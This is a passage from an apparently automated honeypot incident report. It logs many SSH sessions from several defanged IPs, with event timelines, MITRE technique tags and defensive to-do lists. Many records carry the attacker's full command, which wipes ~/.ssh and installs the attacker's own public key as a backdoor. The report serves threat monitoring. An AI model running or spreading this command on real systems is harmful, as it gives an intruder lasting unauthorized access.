| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:14:59` | `cowrie.session.connect` |
| `2026-04-25 17:14:59` | `cowrie.client.version` |
| `2026-04-25 17:14:59` | `cowrie.client.kex` |
| `2026-04-25 17:15:00` | `cowrie.login.success` |
| `2026-04-25 17:15:00` | `cowrie.session.params` |
| `2026-04-25 17:15:00` | `cowrie.command.input` |
| `2026-04-25 17:15:00` | `cowrie.command.failed` |
| `2026-04-25 17:15:00` | `cowrie.log.closed` |
| `2026-04-25 17:15:01` | `cowrie.session.params` |
| `2026-04-25 17:15:01` | `cowrie.command.input` |
| `2026-04-25 17:15:01` | `cowrie.session.file_download` |
| `2026-04-25 17:15:01` | `cowrie.log.closed` |
| `2026-04-25 17:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9e07ffd0d7

| Field | Detail |
|---|---|
| **Source IP** | `152.32.154[.]31` |
| **First Seen** | 2026-04-25 17:15 |
| **Last Seen** | 2026-04-25 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 17:15:04` | `cowrie.session.connect` |
| `2026-04-25 17:15:04` | `cowrie.client.version` |
| `2026-04-25 17:15:04` | `cowrie.client.kex` |
| `2026-04-25 17:15:05` | `cowrie.login.success` |
| `2026-04-25 17:15:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.154[.]31` to AbuseIPDB if not already reported
- [ ] Block `152.32.154[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-123a1d7c3ea4

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:05 |
| **Last Seen** | 2026-04-25 18:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:05:44` | `cowrie.session.connect` |
| `2026-04-25 18:05:44` | `cowrie.client.version` |
| `2026-04-25 18:05:45` | `cowrie.client.kex` |
| `2026-04-25 18:05:45` | `cowrie.login.success` |
| `2026-04-25 18:05:46` | `cowrie.session.params` |
| `2026-04-25 18:05:46` | `cowrie.command.input` |
| `2026-04-25 18:05:46` | `cowrie.command.failed` |
| `2026-04-25 18:05:46` | `cowrie.log.closed` |
| `2026-04-25 18:05:46` | `cowrie.session.params` |
| `2026-04-25 18:05:46` | `cowrie.command.input` |
| `2026-04-25 18:05:46` | `cowrie.session.file_download` |
| `2026-04-25 18:05:46` | `cowrie.log.closed` |
| `2026-04-25 18:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8810a288cf27

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:05 |
| **Last Seen** | 2026-04-25 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:05:48` | `cowrie.session.connect` |
| `2026-04-25 18:05:48` | `cowrie.client.version` |
| `2026-04-25 18:05:48` | `cowrie.client.kex` |
| `2026-04-25 18:05:49` | `cowrie.login.success` |
| `2026-04-25 18:05:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b65e16edfb4

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:07 |
| **Last Seen** | 2026-04-25 18:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:07:11` | `cowrie.session.connect` |
| `2026-04-25 18:07:11` | `cowrie.client.version` |
| `2026-04-25 18:07:11` | `cowrie.client.kex` |
| `2026-04-25 18:07:12` | `cowrie.login.success` |
| `2026-04-25 18:07:12` | `cowrie.session.params` |
| `2026-04-25 18:07:12` | `cowrie.command.input` |
| `2026-04-25 18:07:12` | `cowrie.command.failed` |
| `2026-04-25 18:07:12` | `cowrie.log.closed` |
| `2026-04-25 18:07:13` | `cowrie.session.params` |
| `2026-04-25 18:07:13` | `cowrie.command.input` |
| `2026-04-25 18:07:13` | `cowrie.session.file_download` |
| `2026-04-25 18:07:13` | `cowrie.log.closed` |
| `2026-04-25 18:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b5247d53248

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:07 |
| **Last Seen** | 2026-04-25 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:07:15` | `cowrie.session.connect` |
| `2026-04-25 18:07:15` | `cowrie.client.version` |
| `2026-04-25 18:07:15` | `cowrie.client.kex` |
| `2026-04-25 18:07:16` | `cowrie.login.success` |
| `2026-04-25 18:07:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e18f2dda0b9

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:08 |
| **Last Seen** | 2026-04-25 18:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:08:35` | `cowrie.session.connect` |
| `2026-04-25 18:08:35` | `cowrie.client.version` |
| `2026-04-25 18:08:35` | `cowrie.client.kex` |
| `2026-04-25 18:08:35` | `cowrie.login.success` |
| `2026-04-25 18:08:36` | `cowrie.session.params` |
| `2026-04-25 18:08:36` | `cowrie.command.input` |
| `2026-04-25 18:08:36` | `cowrie.command.failed` |
| `2026-04-25 18:08:36` | `cowrie.log.closed` |
| `2026-04-25 18:08:36` | `cowrie.session.params` |
| `2026-04-25 18:08:36` | `cowrie.command.input` |
| `2026-04-25 18:08:36` | `cowrie.session.file_download` |
| `2026-04-25 18:08:36` | `cowrie.log.closed` |
| `2026-04-25 18:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0f2a00cbf3

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:08 |
| **Last Seen** | 2026-04-25 18:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:08:38` | `cowrie.session.connect` |
| `2026-04-25 18:08:38` | `cowrie.client.version` |
| `2026-04-25 18:08:39` | `cowrie.client.kex` |
| `2026-04-25 18:08:40` | `cowrie.login.success` |
| `2026-04-25 18:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e921b7bf695a

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:12 |
| **Last Seen** | 2026-04-25 18:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:12:38` | `cowrie.session.connect` |
| `2026-04-25 18:12:38` | `cowrie.client.version` |
| `2026-04-25 18:12:38` | `cowrie.client.kex` |
| `2026-04-25 18:12:39` | `cowrie.login.success` |
| `2026-04-25 18:12:39` | `cowrie.session.params` |
| `2026-04-25 18:12:39` | `cowrie.command.input` |
| `2026-04-25 18:12:39` | `cowrie.command.failed` |
| `2026-04-25 18:12:39` | `cowrie.log.closed` |
| `2026-04-25 18:12:39` | `cowrie.session.params` |
| `2026-04-25 18:12:39` | `cowrie.command.input` |
| `2026-04-25 18:12:40` | `cowrie.session.file_download` |
| `2026-04-25 18:12:40` | `cowrie.log.closed` |
| `2026-04-25 18:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccfcfab0d7f9

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:12 |
| **Last Seen** | 2026-04-25 18:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:12:42` | `cowrie.session.connect` |
| `2026-04-25 18:12:42` | `cowrie.client.version` |
| `2026-04-25 18:12:42` | `cowrie.client.kex` |
| `2026-04-25 18:12:42` | `cowrie.login.success` |
| `2026-04-25 18:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66522aba19d1

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:19 |
| **Last Seen** | 2026-04-25 18:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:19:25` | `cowrie.session.connect` |
| `2026-04-25 18:19:25` | `cowrie.client.version` |
| `2026-04-25 18:19:26` | `cowrie.client.kex` |
| `2026-04-25 18:19:26` | `cowrie.login.success` |
| `2026-04-25 18:19:27` | `cowrie.session.params` |
| `2026-04-25 18:19:27` | `cowrie.command.input` |
| `2026-04-25 18:19:27` | `cowrie.command.failed` |
| `2026-04-25 18:19:27` | `cowrie.log.closed` |
| `2026-04-25 18:19:27` | `cowrie.session.params` |
| `2026-04-25 18:19:27` | `cowrie.command.input` |
| `2026-04-25 18:19:27` | `cowrie.session.file_download` |
| `2026-04-25 18:19:27` | `cowrie.log.closed` |
| `2026-04-25 18:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88d7cc1b0a70

| Field | Detail |
|---|---|
| **Source IP** | `147.139.209[.]109` |
| **First Seen** | 2026-04-25 18:19 |
| **Last Seen** | 2026-04-25 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:19:29` | `cowrie.session.connect` |
| `2026-04-25 18:19:29` | `cowrie.client.version` |
| `2026-04-25 18:19:29` | `cowrie.client.kex` |
| `2026-04-25 18:19:30` | `cowrie.login.success` |
| `2026-04-25 18:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.139.209[.]109` to AbuseIPDB if not already reported
- [ ] Block `147.139.209[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25e9bb8f275d

| Field | Detail |
|---|---|
| **Source IP** | `178.128.18[.]100` |
| **First Seen** | 2026-04-25 18:20 |
| **Last Seen** | 2026-04-25 18:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:20:00` | `cowrie.session.connect` |
| `2026-04-25 18:20:00` | `cowrie.client.version` |
| `2026-04-25 18:20:00` | `cowrie.client.kex` |
| `2026-04-25 18:20:00` | `cowrie.login.success` |
| `2026-04-25 18:20:01` | `cowrie.session.params` |
| `2026-04-25 18:20:01` | `cowrie.command.input` |
| `2026-04-25 18:20:01` | `cowrie.command.failed` |
| `2026-04-25 18:20:01` | `cowrie.log.closed` |
| `2026-04-25 18:20:01` | `cowrie.session.params` |
| `2026-04-25 18:20:01` | `cowrie.command.input` |
| `2026-04-25 18:20:01` | `cowrie.session.file_download` |
| `2026-04-25 18:20:01` | `cowrie.log.closed` |
| `2026-04-25 18:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.18[.]100` to AbuseIPDB if not already reported
- [ ] Block `178.128.18[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e8bd58b4e1a

| Field | Detail |
|---|---|
| **Source IP** | `178.128.18[.]100` |
| **First Seen** | 2026-04-25 18:20 |
| **Last Seen** | 2026-04-25 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:20:02` | `cowrie.session.connect` |
| `2026-04-25 18:20:02` | `cowrie.client.version` |
| `2026-04-25 18:20:02` | `cowrie.client.kex` |
| `2026-04-25 18:20:03` | `cowrie.login.success` |
| `2026-04-25 18:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.18[.]100` to AbuseIPDB if not already reported
- [ ] Block `178.128.18[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c112b5963303

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:20 |
| **Last Seen** | 2026-04-25 18:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:20:52` | `cowrie.session.connect` |
| `2026-04-25 18:20:52` | `cowrie.client.version` |
| `2026-04-25 18:20:52` | `cowrie.client.kex` |
| `2026-04-25 18:20:53` | `cowrie.login.success` |
| `2026-04-25 18:20:54` | `cowrie.session.params` |
| `2026-04-25 18:20:54` | `cowrie.command.input` |
| `2026-04-25 18:20:54` | `cowrie.command.failed` |
| `2026-04-25 18:20:54` | `cowrie.log.closed` |
| `2026-04-25 18:20:54` | `cowrie.session.params` |
| `2026-04-25 18:20:54` | `cowrie.command.input` |
| `2026-04-25 18:20:55` | `cowrie.session.file_download` |
| `2026-04-25 18:20:55` | `cowrie.log.closed` |
| `2026-04-25 18:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-625fe42d8b25

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:20 |
| **Last Seen** | 2026-04-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:20:58` | `cowrie.session.connect` |
| `2026-04-25 18:20:58` | `cowrie.client.version` |
| `2026-04-25 18:20:58` | `cowrie.client.kex` |
| `2026-04-25 18:20:59` | `cowrie.login.success` |
| `2026-04-25 18:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.77[.]79` to AbuseIPDB if not already reported
- [ ] Block `129.121.77[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c119a2fe301

| Field | Detail |
|---|---|
| **Source IP** | `129.121.77[.]79` |
| **First Seen** | 2026-04-25 18:21 |
| **Last Seen** | 2026-04-25 18:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-25 18:21:43` | `cowrie.session.connect` |
| `2026-04-25 18:21:43` | `cowrie.client.version` |
| `2026-04-25 18:21:44` | `cowrie.client.kex` |
| `2026-04-25 18:21:45` | `cowrie.login.success` |
| `2026-04-25 18:21:45` | `cowrie.session.params` |
